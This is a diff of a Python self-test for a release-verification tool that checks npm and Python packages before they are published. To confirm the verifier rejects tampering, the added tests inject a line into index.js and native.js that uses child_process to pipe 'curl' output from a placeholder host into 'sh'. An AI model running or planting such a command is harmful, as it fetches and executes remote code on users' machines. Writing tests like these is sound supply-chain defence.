+        judge("platform package + an install script",
+              [npm("platform-install", _with_scripts(_npm_platform(version, "linux-x64-gnu"), install="sh x"))],
+              FAIL, "install")
+        # The JavaScript a consumer runs, and the manifest, are the committed ones.
+        evil = b"\nrequire('child_process').execSync('curl -s https://example.invalid/x | sh');\n"
+        for name in ("index.js", "native.js"):
+            files = _npm_main(version)
+            judge(f"main with an altered {name}", [npm(f"main-{name}", files | {name: files[name] + evil})],
+                  FAIL, f"{name} is crates/qrcode-ai-scanner-node/{name} verbatim")
+        for label, field, value in (("main pointing elsewhere", "main", "evil.js"),
+                                    ("main gaining a bin", "bin", {"qr": "evil.js"}),
+                                    ("main gaining a dependency", "dependencies", {"left-pad": "*"})):
+            files = _npm_main(version, pins)
+            pkg = json.loads(files["package.json"]) | {field: value}
+            judge(label, [npm(re.sub(r"[^a-z0-9]+", "-", label), files | {
+                "package.json": json.dumps(pkg, indent=2).encode()})], FAIL, f"differs in: {field}")
 
         # The main npm package pins exactly every napi target at this version.
         for label, optional, want, release_set, needle in (
@@ -1261,16 +1519,11 @@ def self_test() -> int:
              "win32-x64-msvc"),
         ):
             slug = re.sub(r"[^a-z0-9]+", "-", label)
-            (base / slug).mkdir()
             judge(label, [npm(slug, _npm_main(version, optional))], want, *filter(None, [needle]),
                   release_set=release_set)
         # --release-set over tarballs: one platform tarball per pin, no more.
-        (base / "set").mkdir()
         main = npm("set", _npm_main(version, pins))
-        platforms = []
-        for suffix in napi_suffixes():
-            (base / f"set-{suffix}").mkdir()
-            platforms.append(npm(f"set-{suffix}", _npm_platform(version, suffix)))
+        platforms = [npm(f"set-{suffix}", _npm_platform(version, suffix)) for suffix in napi_suffixes()]
         judge("release set: main + one tarball per pin", [main, *platforms], PASS, release_set=True)
         judge("release set: a pinned platform tarball missing", [main, *platforms[:-1]], FAIL,
               napi_suffixes()[-1], release_set=True)
@@ -1331,8 +1584,9 @@ def build_parser() -> argparse.ArgumentParser:
     parser.add_argument("--nightly", help="profiles: the nightly toolchain for --unit-graph")
     parser.add_argument("--tag", help="versions: the release tag (vX.Y.Z or refs/tags/vX.Y.Z)")
     parser.add_argument("--release-set", action="store_true",
-                        help="node · archive: the npm set about to publish — the main package pins every napi "
-                             "target at this version, and every pin has its platform package")
+                        help="node · archive: the set about to publish, complete and nothing else — npm: the main "
+                             "package pins every napi target at this version and every pin has its platform "
+                             "package; Python: one wheel per row of python.yml's matrix and one sdist")
     return parser
 
 
